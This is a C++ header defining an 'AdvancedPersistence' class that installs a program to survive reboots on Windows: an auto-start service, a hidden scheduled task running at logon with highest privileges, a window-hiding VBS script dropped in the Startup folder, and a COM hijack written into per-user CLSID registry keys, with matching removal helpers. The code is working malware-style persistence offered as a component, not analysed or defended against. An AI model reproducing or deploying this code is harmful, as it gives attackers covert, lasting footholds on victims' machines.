#pragma once

#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <ShlObj.h>
#include <string>
#include <vector>
#include <fstream>

#include "domain/common/StringTable.hpp"

namespace nuub::infrastructure::system {

class AdvancedPersistence {
public:
    // ── 1. Windows Service Installation ────────────────────────
    // Creates a Windows service that auto-starts on boot
    static bool install_service(const std::string& service_name, const std::string& display_name) {
        std::wstring wservice(service_name.begin(), service_name.end());
        std::wstring wdisplay(display_name.begin(), display_name.end());

        wchar_t exe_path[MAX_PATH]{};
        GetModuleFileNameW(nullptr, exe_path, MAX_PATH);

        SC_HANDLE sc_manager = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
        if (!sc_manager) return false;

        SC_HANDLE service = CreateServiceW(
            sc_manager,
            wservice.c_str(),
            wdisplay.c_str(),
            SERVICE_ALL_ACCESS,
            SERVICE_WIN32_OWN_PROCESS,
            SERVICE_AUTO_START,
            SERVICE_ERROR_NORMAL,
            exe_path,
            nullptr, nullptr, nullptr, nullptr, nullptr);

        if (!service) {
            // Service might already exist — try to update
            service = OpenServiceW(sc_manager, wservice.c_str(), SERVICE_CHANGE_CONFIG);
            if (service) {
                ChangeServiceConfigW(service,
                    SERVICE_WIN32_OWN_PROCESS,
                    SERVICE_AUTO_START,
                    SERVICE_ERROR_NORMAL,
                    exe_path,
                    nullptr, nullptr, nullptr, nullptr, nullptr,
                    wdisplay.c_str());
            }
        }

        if (service) {
            CloseServiceHandle(service);
        }
        CloseServiceHandle(sc_manager);
        return service != nullptr;
    }

    // ── 2. Scheduled Task ──────────────────────────────────────
    // Creates a scheduled task that runs at logon
    static bool install_scheduled_task(const std::string& task_name) {
        wchar_t exe_path[MAX_PATH]{};
        GetModuleFileNameW(nullptr, exe_path, MAX_PATH);

        // Use schtasks.exe to create the task
        std::wstring cmd = L"schtasks.exe /create /tn \"" +
                          std::wstring(task_name.begin(), task_name.end()) +
                          L"\" /tr \"\\\"" + std::wstring(exe_path) + L"\\\"\" "
                          L"/sc onlogon /rl highest /f";

        STARTUPINFOW si{};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION pi{};

        bool result = CreateProcessW(nullptr, cmd.data(), nullptr, nullptr,
                                     FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
        if (result) {
            WaitForSingleObject(pi.hProcess, 10000);
            DWORD exit_code = 0;
            GetExitCodeProcess(pi.hProcess, &exit_code);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return exit_code == 0;
        }
        return false;
    }

    // ── 3. Startup Folder Shortcut ─────────────────────────────
    // Drops a .lnk shortcut in the Startup folder
    static bool install_startup_folder(const std::string& shortcut_name) {
        wchar_t exe_path[MAX_PATH]{};
        GetModuleFileNameW(nullptr, exe_path, MAX_PATH);

        // Get Startup folder path
        wchar_t startup_path[MAX_PATH]{};
        if (FAILED(SHGetFolderPathW(nullptr, CSIDL_STARTUP, nullptr, 0, startup_path))) {
            return false;
        }

        // Create VBS script that hides the window
        std::wstring vbs_path = std::wstring(startup_path) + L"\\" +
                               std::wstring(shortcut_name.begin(), shortcut_name.end()) + L".vbs";

        // Convert wstring path to narrow string for ofstream
        std::string narrow_path(vbs_path.begin(), vbs_path.end());

        // Build VBS content as narrow string
        std::string exe_path_narrow(exe_path, exe_path + wcslen(exe_path));
        std::string vbs_content =
            "Set WshShell = CreateObject(\"WScript.Shell\")\n"
            "WshShell.Run \"\\\"" + exe_path_narrow + "\\\"\", 0, False\n";

        std::ofstream ofs(narrow_path);
        if (!ofs.is_open()) return false;
        ofs << vbs_content;
        ofs.close();

        return true;
    }

    // ── 4. COM Object Hijacking (Search Order) ─────────────────
    // Copies exe to a location that will be loaded before the legitimate DLL
    static bool install_com_hijack(const std::string& clsid) {
        wchar_t exe_path[MAX_PATH]{};
        GetModuleFileNameW(nullptr, exe_path, MAX_PATH);

        // Create HKCU\Software\Classes\CLSID\{CLSID}\InprocServer32
        std::wstring key_path = L"Software\\Classes\\CLSID\\{" +
                               std::wstring(clsid.begin(), clsid.end()) +
                               L"}\\InprocServer32";

        HKEY hkey;
        LONG result = RegCreateKeyExW(HKEY_CURRENT_USER, key_path.c_str(),
                                       0, nullptr, 0, KEY_SET_VALUE, nullptr, &hkey, nullptr);
        if (result != ERROR_SUCCESS) return false;

        RegSetValueExW(hkey, nullptr, 0, REG_SZ,
                       reinterpret_cast<const BYTE*>(exe_path),
                       static_cast<DWORD>((wcslen(exe_path) + 1) * sizeof(wchar_t)));

        // Set threading model
        std::wstring model = L"Both";
        RegSetValueExW(hkey, L"ThreadingModel", 0, REG_SZ,
                       reinterpret_cast<const BYTE*>(model.c_str()),
                       static_cast<DWORD>((model.size() + 1) * sizeof(wchar_t)));

        RegCloseKey(hkey);
        return true;
    }

    // ── 5. Removal helpers ─────────────────────────────────────
    static bool remove_service(const std::string& service_name) {
        std::wstring wservice(service_name.begin(), service_name.end());

        SC_HANDLE sc_manager = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
        if (!sc_manager) return false;

        SC_HANDLE service = OpenServiceW(sc_manager, wservice.c_str(), DELETE);
        if (!service) {
            CloseServiceHandle(sc_manager);
            return false;
        }

        bool result = DeleteService(service) != 0;
        CloseServiceHandle(service);
        CloseServiceHandle(sc_manager);
        return result;
    }

    static bool remove_scheduled_task(const std::string& task_name) {
        std::wstring cmd = L"schtasks.exe /delete /tn \"" +
                          std::wstring(task_name.begin(), task_name.end()) + L"\" /f";

        STARTUPINFOW si{};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION pi{};

        bool result = CreateProcessW(nullptr, cmd.data(), nullptr, nullptr,
                                     FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
        if (result) {
            WaitForSingleObject(pi.hProcess, 10000);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        return result;
    }

    static bool remove_startup_folder(const std::string& shortcut_name) {
        wchar_t startup_path[MAX_PATH]{};
        if (FAILED(SHGetFolderPathW(nullptr, CSIDL_STARTUP, nullptr, 0, startup_path))) {
            return false;
        }

        std::wstring vbs_path = std::wstring(startup_path) + L"\\" +
                               std::wstring(shortcut_name.begin(), shortcut_name.end()) + L".vbs";
        return DeleteFileW(vbs_path.c_str()) != 0;
    }

    static bool remove_com_hijack(const std::string& clsid) {
        std::wstring key_path = L"Software\\Classes\\CLSID\\{" +
                               std::wstring(clsid.begin(), clsid.end()) + L"}";
        return RegDeleteTreeW(HKEY_CURRENT_USER, key_path.c_str()) == ERROR_SUCCESS;
    }
};

} // namespace nuub::infrastructure::system
#endif
